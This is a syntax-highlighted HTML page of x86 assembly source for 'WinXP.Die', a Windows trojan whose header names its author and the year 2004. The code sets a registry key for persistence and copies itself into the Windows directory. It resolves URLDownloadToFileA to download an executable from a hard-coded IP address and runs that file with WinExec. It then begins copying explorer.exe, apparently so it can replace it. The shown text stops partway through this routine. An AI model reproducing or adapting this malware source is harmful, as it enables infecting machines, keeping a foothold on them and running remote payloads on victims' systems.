<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>die.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">.586p</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">


</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">W32nt_lj.inc</span><span class="sc0">

    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">lstrlenW</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">Process32First</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">Process32Next</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">CreateToolhelp32Snapshot</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">OpenProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">TerminateProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">MoveFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">lstrlenA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">RegCreateKeyExA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">RegSetValueA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">WinExec</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc1">; comment %</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;               WinXP.Die by opc0de/[DCA] </span><span class="sc0">
</span><span class="sc1">;                        simple small trojan</span><span class="sc0">
</span><span class="sc1">;                 Copyright (C) 2004 by opc0de</span><span class="sc0">
</span><span class="sc1">;                        All rights reserved</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   %</span><span class="sc0">

</span><span class="sc5">ProcessEntry32</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">dwSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;specifies the length in bytes of the structure</span><span class="sc0">
</span><span class="sc5">cntUsage</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc1">;nr of references to the process</span><span class="sc0">
</span><span class="sc5">th32ProcessID</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;PID</span><span class="sc0">
</span><span class="sc5">th32DefaultHeapID</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;ID for the process heap</span><span class="sc0">
</span><span class="sc5">th32ModuleID</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; Module ID</span><span class="sc0">
</span><span class="sc5">cntThreads</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; number of threads</span><span class="sc0">
</span><span class="sc5">th32ParentProcessID</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; id of the parent process</span><span class="sc0">
</span><span class="sc5">pcPriClassBase</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; base priority of the threads created</span><span class="sc0">
</span><span class="sc5">dwFlags</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;do not use</span><span class="sc0">
</span><span class="sc5">szExeName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">261</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Zero terminated string indicating the process name </span><span class="sc0">
</span><span class="sc5">ProcessEntry32</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">
    



</span><span class="sc9">.data</span><span class="sc0">
    </span><span class="sc5">ec</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'sex.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   
    </span><span class="sc5">file</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'http://82.77.69.108/tinywww.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">app</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">tdmp</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">new</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'o'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'f'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'t'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'r'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'\',0,'</span><span class="sc5">M</span><span class="sc12">',0,'</span><span class="sc5">i</span><span class="sc12">',0,'</span><span class="sc10">c</span><span class="sc12">',0,'</span><span class="sc5">r</span><span class="sc12">',0,'</span><span class="sc5">o</span><span class="sc12">',0,'</span><span class="sc5">s</span><span class="sc12">',0,'</span><span class="sc5">o</span><span class="sc12">',0,'</span><span class="sc5">f</span><span class="sc12">',0,'</span><span class="sc5">t</span><span class="sc12">',0,'</span><span class="sc0">\</span><span class="sc12">',0,'</span><span class="sc5">W</span><span class="sc12">',0,'</span><span class="sc5">i</span><span class="sc12">',0,'</span><span class="sc5">n</span><span class="sc12">',0,'</span><span class="sc5">d</span><span class="sc12">',0,'</span><span class="sc5">o</span><span class="sc12">',0,'</span><span class="sc5">w</span><span class="sc12">',0,'</span><span class="sc5">s</span><span class="sc12">',0,'</span><span class="sc0">\</span><span class="sc12">',0,'</span><span class="sc10">C</span><span class="sc12">',0,'</span><span class="sc5">u</span><span class="sc12">',0,'</span><span class="sc5">r</span><span class="sc12">',0,'</span><span class="sc5">r</span><span class="sc12">',0,'</span><span class="sc5">e</span><span class="sc12">',0,'</span><span class="sc5">n</span><span class="sc12">',0,'</span><span class="sc5">t</span><span class="sc12">',0,'</span><span class="sc5">V</span><span class="sc12">',0,'</span><span class="sc5">e</span><span class="sc12">',0,'</span><span class="sc5">r</span><span class="sc12">',0,'</span><span class="sc5">s</span><span class="sc12">',0,'</span><span class="sc5">i</span><span class="sc12">',0,'</span><span class="sc5">o</span><span class="sc12">',0,'</span><span class="sc5">n</span><span class="sc12">',0,'</span><span class="sc0">\</span><span class="sc12">',0,'</span><span class="sc10">C</span><span class="sc12">',0,'</span><span class="sc5">f</span><span class="sc12">',0,'</span><span class="sc5">g</span><span class="sc12">',0,'</span><span class="sc5">s</span><span class="sc12">',0,'</span><span class="sc5">y</span><span class="sc12">',0,'</span><span class="sc5">t</span><span class="sc12">',0,'</span><span class="sc5">m</span><span class="sc13">',0
</span><span class="sc0">    </span><span class="sc5">newz</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Software\Microsoft\Windows\CurrentVersion\Cfgsytm'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">nil</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WinXP.Die by opc0de/[DCA]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dir</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">255</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">target</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\explorer.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">fileit</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\cfg.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">back</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'explorer.bak'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">myfile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'exploder.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">myfile2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\exploder.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">path</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'o'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'f'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'t'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'r'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'\',0,'</span><span class="sc5">M</span><span class="sc12">',0,'</span><span class="sc5">i</span><span class="sc12">',0,'</span><span class="sc10">c</span><span class="sc12">',0,'</span><span class="sc5">r</span><span class="sc12">',0,'</span><span class="sc5">o</span><span class="sc12">',0,'</span><span class="sc5">s</span><span class="sc12">',0,'</span><span class="sc5">o</span><span class="sc12">',0,'</span><span class="sc5">f</span><span class="sc12">',0,'</span><span class="sc5">t</span><span class="sc12">',0,'</span><span class="sc0">\</span><span class="sc12">',0,'</span><span class="sc5">W</span><span class="sc12">',0,'</span><span class="sc5">i</span><span class="sc12">',0,'</span><span class="sc5">n</span><span class="sc12">',0,'</span><span class="sc5">d</span><span class="sc12">',0,'</span><span class="sc5">o</span><span class="sc12">',0,'</span><span class="sc5">w</span><span class="sc12">',0,'</span><span class="sc5">s</span><span class="sc12">',0,'</span><span class="sc0">\</span><span class="sc12">',0,'</span><span class="sc10">C</span><span class="sc12">',0,'</span><span class="sc5">u</span><span class="sc12">',0,'</span><span class="sc5">r</span><span class="sc12">',0,'</span><span class="sc5">r</span><span class="sc12">',0,'</span><span class="sc5">e</span><span class="sc12">',0,'</span><span class="sc5">n</span><span class="sc12">',0,'</span><span class="sc5">t</span><span class="sc12">',0,'</span><span class="sc5">V</span><span class="sc12">',0,'</span><span class="sc5">e</span><span class="sc12">',0,'</span><span class="sc5">r</span><span class="sc12">',0,'</span><span class="sc5">s</span><span class="sc12">',0,'</span><span class="sc5">i</span><span class="sc12">',0,'</span><span class="sc5">o</span><span class="sc12">',0,'</span><span class="sc5">n</span><span class="sc12">',0,'</span><span class="sc0">\</span><span class="sc12">',0,'</span><span class="sc5">R</span><span class="sc12">',0,'</span><span class="sc5">u</span><span class="sc12">',0,'</span><span class="sc5">n</span><span class="sc13">',0
</span><span class="sc0">    </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">explore</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'EXPLORER.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">map</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">snap</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">instreg</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'regedit.exe instl.reg'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">reg</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'instl.reg'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">paty</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">final</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">dess</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'exploder.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">KEY_ALL_ACCESS</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0F003FH</span><span class="sc0">    
    </span><span class="sc5">disposition</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">key_handle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc6">js</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'die.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dll</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Urlmon.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   
    </span><span class="sc5">check</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'URLDownloadToFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">Download</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">partition</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  
    </span><span class="sc5">filemap</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">createf</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        


</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">CreateKey</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">disposition</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key_handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">KEY_ALL_ACCESS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newz</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">RegCreateKeyExA</span><span class="sc0">


        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dir</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fileit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dir</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">tdmp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">    


        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc6">js</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">tdmp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrlenA</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">tdmp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newz</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegSetValueA</span><span class="sc0">
        
        
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dll</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">check</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
        
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">Download</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">


            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">partition</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">dir</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        
        </span><span class="sc5">@@loopz</span><span class="sc4">:</span><span class="sc0">                                        
            
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@loopz</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ec</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">partition</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Download</span><span class="sc0">
                    
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WinExec</span><span class="sc0">        

            
                        
            
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">CreateKey</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


    </span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateKey</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">  
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">                

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@exit</span><span class="sc0">
    
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
        

            
</span><span class="sc5">@@cnt</span><span class="sc4">:</span><span class="sc0">
                        

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dir</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">target</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dir</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">paty</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myfile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">myfile</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
